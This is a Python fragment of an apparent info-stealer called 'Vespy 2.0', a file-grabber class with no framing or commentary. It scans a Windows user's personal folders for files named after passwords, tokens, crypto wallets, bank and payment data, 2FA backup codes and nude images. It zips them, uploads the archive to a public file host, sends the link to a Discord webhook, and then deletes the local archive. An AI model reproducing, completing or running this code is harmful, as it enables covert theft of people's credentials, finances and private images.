class A:
	def __init__(A):
		A.ZIP=ZipFile(f"C:\\Users\\{user}\\AppData\\Files.zip",'w');A.folders=[];A.files=0;A.filter=['dll','jpg','jpeg','png','mp4','mp3','webm'];A.goal=['token','webhook','password','passcode','crypto','wallet','money','school','homework','paypal','cashapp','cookies','account','bank','cash','creditcard','payment','2fa','2step','recovery','grab','nude','address','backup_codes'];B=[f"{winshell.desktop()}",f"C:\\Users\\{user}\\Downloads",f"C:\\Users\\{user}\\Documents",f"C:\\Users\\{user}\\Videos",f"C:\\Users\\{user}\\Pictures",f"C:\\Users\\{user}\\Music"]
		for C in B:A.Grab(C)
		A.upload_send()
	def Grab(A,_):
		C='\\'
		try:
			if _ in A.folders:0
			else:
				A.folders.append(_);E=os.listdir(_)
				for B in E:
					if os.path.isdir(_+C+B):A.Grab(_+C+B)
					else:
						for F in A.goal:
							if F in B:
								try:
									G=B.split('.')[-0];D=B.split('.')[-1]
									if D not in tuple(A.filter):A.files+=1;A.ZIP.write(_+C+B,G+f"_{randint(1,999)}."+D)
								except:pass
		except:pass
	def upload_send(B):E='https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png';D='file';B.ZIP.close();F=requests.post('https://api.anonfiles.com/upload',files={D:open(f"C:\\Users\\{user}\\AppData\\Files.zip",'rb')});G=F.json()['data'][D]['url']['full'];C=DiscordWebhook(url=wbh,username='Vespy 2.0',avatar_url=E);A=DiscordEmbed(title=f"File Grabber",description=f"User's File Grabbed",color='4300d1');A.set_author(name='author : Beadiddd',icon_url=E);A.set_footer(text='Beadiddd 2.0 | by : Beadiddd');A.set_timestamp();A.add_embed_field(name=f":page_facing_up: Amount of Files Grabbed : ",value=f"``{B.files}``\n\n:file_folder: **ZIP with Grabbed files** : \n**{G}**");C.add_embed(A);C.execute();os.remove(f"C:\\Users\\{user}\\AppData\\Files.zip")